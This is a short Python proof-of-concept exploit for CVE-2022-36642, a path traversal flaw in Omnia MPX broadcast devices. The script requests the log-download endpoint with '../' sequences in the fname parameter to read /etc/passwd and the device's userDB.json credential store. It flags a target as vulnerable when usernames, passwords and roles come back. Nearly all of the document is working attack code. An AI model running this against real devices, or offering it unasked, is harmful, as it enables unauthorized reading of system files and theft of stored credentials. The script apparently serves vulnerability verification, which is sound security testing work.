# title: Omnia MPX 1.5.0+r1 - Path Traversal CVE-2022-36642
# author: antx
# cveid: CVE-2022-36642

from poctools import BasicPoc


class APoc(BasicPoc):

    def __init__(self):
        super(APoc, self).__init__()
        self.name = 'A-Poc'

    def verify(self, url: str):
        url = url.rstrip("/")
        target = f'{url}/logs/downloadMainLog?fname=../../../../../../..//etc/passwd'
        target2 = f'{url}/logs/downloadMainLog?fname=../../../../../../..///config/MPXnode/www/appConfig/userDB.json'
        try:
            resp = self.get(target)
            resp2 = self.get(target2)
            if resp.status_code == 200 and '"username":' in resp.text and '"password":' in resp.text and '"mustChangePwd":' in resp.text and '"roleUser":' in resp.text:
                return True
            if resp2.status_code == 200 and '"username":' in resp2.text and '"password":' in resp2.text and '"mustChangePwd":' in resp2.text and '"roleUser":' in resp2.text:
                return True
        except Exception as e:
            pass
        return False


if __name__ == '__main__':
    target = 'http://127.0.0.1'
    tp = APoc()
    result = tp.run(url=target)
    print(f'{target} -> {result}')
